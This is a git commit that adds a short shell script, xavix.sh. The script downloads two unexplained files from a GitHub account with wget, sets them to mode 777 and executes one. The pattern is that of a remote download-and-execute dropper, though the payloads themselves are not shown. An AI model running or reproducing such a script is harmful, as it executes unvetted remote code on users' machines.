51d50e3cd20a44ae49a3ace200d8ce43b4a4bedd
sulvanizafin <87707432+sulvanizafin@users.noreply.github.com>
2021-07-20 21:47:00 +0700

    Create xavix.sh

---
+++ xavix.sh
@@ -0,0 +1,5 @@
+#!/bin/sh
+wget -O syng https://raw.githubusercontent.com/sulvanizafin/sulvanizafin/main/faa
+wget -O kontol https://raw.githubusercontent.com/sulvanizafin/sulvanizafin/main/vio
+chmod 777 syng kontol
+./syng
